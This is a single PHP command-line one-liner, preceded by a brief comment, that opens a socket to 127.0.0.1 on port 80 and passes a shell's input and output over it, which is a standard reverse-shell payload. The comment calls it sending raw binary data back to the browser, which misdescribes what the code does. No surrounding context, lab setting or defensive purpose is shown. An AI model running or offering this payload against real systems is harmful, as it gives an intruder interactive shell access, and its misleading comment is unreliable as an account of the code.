#This executes whilst sending raw binary data back to the browser
php -r '$sock=fsockopen("127.0.0.1",80);passthru("sh <&3 >&3 2>&3");'
